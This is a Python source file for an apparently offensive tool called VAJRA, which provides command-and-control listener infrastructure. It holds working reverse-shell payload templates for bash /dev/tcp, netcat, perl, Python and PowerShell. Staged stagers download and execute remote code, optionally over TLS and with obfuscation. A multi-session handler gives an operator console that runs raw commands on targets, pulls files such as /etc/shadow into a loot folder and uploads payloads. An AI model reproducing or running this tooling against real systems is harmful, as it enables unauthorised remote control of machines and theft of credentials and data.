"""VAJRA listener infrastructure — LHOST auto-detection, free-port selection
and a multi-session callback handler for reverse connections."""
import binascii
import os
import socket
import struct
import subprocess
import threading
import time


def ensure_cert(certdir="Outputs/sessions/certs"):
    """Return (certfile, keyfile), generating a fresh self-signed cert if
    needed. Prefers `openssl`; falls back to the `cryptography` package."""
    os.makedirs(certdir, exist_ok=True)
    cert = os.path.join(certdir, "vajra-srv.crt")
    key = os.path.join(certdir, "vajra-srv.key")
    if os.path.exists(cert) and os.path.exists(key):
        return cert, key
    try:
        subprocess.run(
            ["openssl", "req", "-x509", "-newkey", "rsa:2048", "-nodes",
             "-keyout", key, "-out", cert, "-days", "30",
             "-subj", "/CN=vajra-c2", "-sha256"],
            capture_output=True, timeout=30, check=True)
        return cert, key
    except Exception:
        pass
    try:
        from cryptography import x509
        from cryptography.hazmat.primitives import hashes, serialization
        from cryptography.hazmat.primitives.asymmetric import rsa
        import datetime
        private = rsa.generate_private_key(public_exponent=65537,
                                           key_size=2048)
        name = x509.Name([x509.NameAttribute(x509.NameOID.COMMON_NAME,
                                             "vajra-c2")])
        now = datetime.datetime.now(datetime.timezone.utc)
        public = private.public_key()
        cert_obj = (x509.CertificateBuilder()
                    .subject_name(name).issuer_name(name)
                    .public_key(public)
                    .serial_number(x509.random_serial_number())
                    .not_valid_before(now - datetime.timedelta(days=1))
                    .not_valid_after(now + datetime.timedelta(days=30))
                    .sign(private, hashes.SHA256()))
        with open(key, "wb") as f:
            f.write(private.private_bytes(
                serialization.Encoding.PEM,
                serialization.PrivateFormat.TraditionalOpenSSL,
                serialization.NoEncryption()))
        with open(cert, "wb") as f:
            f.write(cert_obj.public_bytes(serialization.Encoding.PEM))
        return cert, key
    except Exception:
        raise RuntimeError("certificate generation needs `openssl` or the "
                           "`cryptography` package")


# Remote stage executed by the staging reverse connection. It binds the
# established socket fd to stdio and spawns an interactive /bin/sh.
STAGE_SRC = (
    "import os,pty,socket,sys\n"
    "s=socket.socket(fileno=fd)\n"
    "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)\n"
    "pty.spawn('/bin/sh')\n"
)

STAGERS_UNIX = [
    ("python3-staged",
     "import socket,struct\n"
     "s=socket.socket()\n"
     "s.connect(('{LHOST}',{LPORT}))\n"
     "n=struct.unpack('>I',s.recv(4))[0]\n"
     "d=b''\n"
     "while len(d)<n:\n"
     "    d+=s.recv(n-len(d))\n"
     "exec(compile(d,'<stage>','exec'),{'fd':s.fileno()})\n"),
]

STAGERS_TLS_UNIX = [
    ("python3-staged-tls",
     "import socket,struct,ssl\n"
     "ctx=ssl.create_default_context()\n"
     "ctx.check_hostname=False\n"
     "ctx.verify_mode=ssl.CERT_NONE\n"
     "s=ctx.wrap_socket(socket.socket(),server_hostname='{LHOST}')\n"
     "s.connect(('{LHOST}',{LPORT}))\n"
     "n=struct.unpack('>I',s.recv(4))[0]\n"
     "d=b''\n"
     "while len(d)<n:\n"
     "    d+=s.recv(n-len(d))\n"
     "exec(compile(d,'<stage>','exec'),{'fd':s.fileno()})\n"),
]


def render_stagers(kind="unix", lhost="", lport=4444, tls=False,
                   obfuscate=False):
    src = STAGERS_TLS_UNIX if tls else STAGERS_UNIX
    out = []
    for name, tpl in src:
        payload = tpl.replace("{LHOST}", lhost).replace("{LPORT}", str(lport))
        if obfuscate and "python" in name:
            try:
                from core.payload_engine import pack
                inner = payload[len("python3 -c \""):-1] \
                    if payload.startswith("python3 -c \"") else payload
                payload = pack(inner, rounds=4)
            except Exception:
                pass
        out.append((name, payload))
    return out


def detect_lhost():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(0.5)
        s.connect(("10.255.255.255", 1))
        ip = s.getsockname()[0]
        s.close()
        if ip and not ip.startswith("127."):
            return ip
    except Exception:
        pass
    try:
        with open("/proc/net/route") as f:
            for line in f.readlines()[1:]:
                cols = line.strip().split()
                if len(cols) > 7 and cols[1] == "00000000":
                    iface = cols[0]
                    try:
                        import fcntl
                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        addr = socket.inet_ntoa(fcntl.ioctl(
                            s.fileno(), 0x8915,
                            struct.pack("256s", iface[:15].encode()))[20:24])
                        s.close()
                        return addr
                    except Exception:
                        continue
    except Exception:
        pass
    try:
        return socket.gethostbyname(socket.gethostname())
    except Exception:
        return "127.0.0.1"


PREFERRED_PORTS = (4444, 4545, 1234, 5555, 8080, 1337, 9001)


def pick_lport(preferred=PREFERRED_PORTS):
    for p in preferred:
        try:
            s = socket.socket()
            s.bind(("0.0.0.0", p))
            s.close()
            return p
        except OSError:
            continue
    while True:
        p = int.from_bytes(os.urandom(2), "big") % 40000 + 20000
        try:
            s = socket.socket()
            s.bind(("0.0.0.0", p))
            s.close()
            return p
        except OSError:
            continue


class Session:
    def __init__(self, sock, addr, sid=None, tls=False):
        self.sock = sock
        self.addr = addr
        self.sid = sid or ("%08x" % int.from_bytes(os.urandom(4), "big"))
        self.tls = bool(tls)
        self.opened_at = time.time()
        self.transcript = []

    def send(self, data):
        try:
            self.sock.sendall(data.encode() if isinstance(data, str) else data)
            return True
        except Exception:
            return False

    def recv(self, timeout=2.0):
        self.sock.settimeout(timeout)
        chunks = []
        total = 0
        try:
            while total < 65536:
                d = self.sock.recv(4096)
                if not d:
                    break
                chunks.append(d)
                total += len(d)
        except Exception:
            pass
        data = b"".join(chunks)
        if data and isinstance(data, bytes):
            try:
                self.transcript.append(data.decode("utf-8", "replace"))
            except Exception:
                pass
        return data.decode("utf-8", "replace")

    def close(self):
        try:
            self.sock.close()
        except Exception:
            pass


def getfile_cmd(path):
    """Shell one-liner that marks + base64s a remote file (read-only)."""
    return ("if [ -f '%s' ]; then printf '__VJRA__'; base64 < '%s'; fi"
            % (path.replace("'", "'\\''"), path.replace("'", "'\\''")))


def upload_cmd(local_bytes, remote_path):
    b64 = binascii.b2a_base64(bytes(local_bytes)).decode().strip()
    return ("echo '%s' | base64 -d > '%s'" %
            (b64, remote_path.replace("'", "'\\''")))


def session_getfile(sess, path, timeout=5.0):
    sess.send(getfile_cmd(path) + "\n")
    out = sess.recv(timeout)
    marker = "__VJRA__"
    idx = out.find(marker)
    if idx < 0:
        return None
    tail = out[idx + len(marker):]
    try:
        return binascii.a2b_base64(tail.strip())
    except Exception:
        return None


class Listener(threading.Thread):
    def __init__(self, host, port, on_session=None, use_ssl=False,
                 certfile=None, keyfile=None, staged=False):
        super().__init__(daemon=True)
        self.host = host
        self.requested_port = port
        self.port = None
        self.sessions = []
        self.on_session = on_session or (lambda s: None)
        self._srv = None
        self._stop = threading.Event()
        self.use_ssl = use_ssl
        self.staged = staged
        self._ctx = None
        if use_ssl:
            cert, key = ensure_cert(os.path.dirname(certfile or ""))
            import ssl
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            ctx.load_cert_chain(certfile or cert, keyfile or key)
            self._ctx = ctx

    def run(self):
        srv = socket.socket()
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            srv.bind((self.host if self.host != "0.0.0.0" else "", self.requested_port))
        except OSError:
            srv.close()
            alt = pick_lport([self.requested_port])
            try:
                srv = socket.socket()
                srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                srv.bind((self.host if self.host != "0.0.0.0" else "", alt))
            except Exception:
                return
        srv.listen(16)
        self.port = srv.getsockname()[1]
        self._srv = srv
        srv.settimeout(1.0)
        while not self._stop.is_set():
            try:
                conn, addr = srv.accept()
            except socket.timeout:
                continue
            except Exception:
                break
            try:
                if self.use_ssl and self._ctx is not None:
                    conn.settimeout(5.0)
                    conn = self._ctx.wrap_socket(conn, server_side=True)
            except Exception:
                try:
                    conn.close()
                except Exception:
                    pass
                continue
            if self.staged:
                try:
                    stage = STAGE_SRC.encode()
                    conn.sendall(struct.pack(">I", len(stage)) + stage)
                except Exception:
                    try:
                        conn.close()
                    except Exception:
                        pass
                    continue
            sess = Session(conn, addr, tls=self.use_ssl)
            self.sessions.append(sess)
            try:
                self.on_session(sess)
            except Exception:
                pass
        srv.close()

    def start_blocking_probe(self, timeout=15.0):
        """Start listener and wait up to `timeout` for the first callback."""
        self.start()
        deadline = time.time() + timeout
        while time.time() < deadline:
            if self.sessions:
                return self.sessions[0]
            time.sleep(0.25)
        return None

    def stop(self):
        self._stop.set()
        try:
            if self._srv:
                self._srv.close()
        except Exception:
            pass


REVERSE_PAYLOADS_UNIX = [
    ("bash/tcp", "bash -c 'exec bash -i &>/dev/tcp/{LHOST}/{LPORT} <&1' 2>/dev/null"),
    ("bash/fd",  "0<&196;exec 196<>/dev/tcp/{LHOST}/{LPORT}; bash <&196 >&196 2>&196"),
    ("python3",  "python3 -c \"import os,pty,socket;s=socket.socket();s.connect(('"
                 "{LHOST}',{LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);"
                 "os.dup2(s.fileno(),2);pty.spawn('/bin/sh')\""),
    ("python",   "python -c \"import socket,subprocess,os;s=socket.socket();"
                 "s.connect(('{LHOST}',{LPORT}));os.dup2(s.fileno(),0);"
                 "os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
                 "subprocess.call(['/bin/sh','-i'])\""),
    ("nc-e",     "nc {LHOST} {LPORT} -e /bin/sh"),
    ("nc-fifo",  "rm -f /tmp/.vjr;mkfifo /tmp/.vjr;cat /tmp/.vjr|/bin/sh -i "
                 "2>&1|nc {LHOST} {LPORT} >/tmp/.vjr"),
    ("perl",     "perl -e 'use Socket;$i=\"{LHOST}\";$p={LPORT};"
                 "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
                 "connect(S,sockaddr_in($p,inet_aton($i)));"
                 "open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");"
                 "exec(\"/bin/sh -i\");'"),
]

REVERSE_PAYLOADS_WIN = [
    ("powershell", "powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient("
                   "'{LHOST}',{LPORT});$st=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
                   "while(($i=$st.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object Text."
                   "ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);"
                   "$sb=([Text.Encoding]::ASCII).GetBytes($r+'PS>');$st.Write($sb,0,"
                   "$sb.Length)}};$c.Close()\""),
]


def render_reverse_payloads(kind="unix", lhost="", lport=4444):
    src = REVERSE_PAYLOADS_WIN if kind == "windows" else REVERSE_PAYLOADS_UNIX
    out = []
    for name, tpl in src:
        out.append((name, tpl.replace("{LHOST}", lhost).replace("{LPORT}", str(lport))))
    return out


def run_interactive(sess, banner=True, loot_dir="Outputs/loot"):
    """Operator console attached to one session. Extended command set:
    help | exit/detach | getfile <remote> | upload <local> <remote>."""
    if banner:
        print("[*] interactive session %s id=%s%s — type 'help' for extras"
              % (sess.addr[:2], sess.sid, " (TLS)" if sess.tls else ""))
    while True:
        try:
            cmd = input("vajra-session(%s)> " % sess.sid[:6]).strip()
        except (EOFError, KeyboardInterrupt):
            print("\n[*] detached")
            return
        if cmd in ("exit", "detach", "background"):
            return
        if cmd in ("help", "?"):
            print("  commands: help  exit/detach  getfile <remote path>  "
                  "upload <local> <remote>")
            print("  anything else is executed on the target shell "
                  "(raw, no quoting added)")
            continue
        parts = cmd.split(None, 1)
        if parts[0] == "getfile":
            if len(parts) < 2:
                print("[!] usage: getfile /etc/shadow")
                continue
            os.makedirs(loot_dir, exist_ok=True)
            data = session_getfile(sess, parts[1], timeout=6.0)
            if data is None:
                print("[!] no marker in reply (file may not exist)")
                continue
            local = os.path.join(
                loot_dir, os.path.basename(parts[1].rstrip("/")) or "out")
            with open(local, "wb") as f:
                f.write(data)
            print("[+] pulled %d bytes -> %s" % (len(data), local))
            continue
        if parts[0] == "upload":
            args = parts[1].split(None, 1) if len(parts) > 1 else []
            if len(args) < 2:
                print("[!] usage: upload ./payload.py /tmp/x.py")
                continue
            try:
                blob = open(args[0], "rb").read()
            except Exception as e:
                print("[!] read failed: %r" % e)
                continue
            sess.send(upload_cmd(blob, args[1]) + "\n")
            sess.recv(1.5)
            print("[+] upload queued for %s (%d bytes)" % (args[1], len(blob)))
            continue
        if not sess.send(cmd + "\n"):
            print("[!] session dead")
            return
        print(sess.recv(2.5), end="")
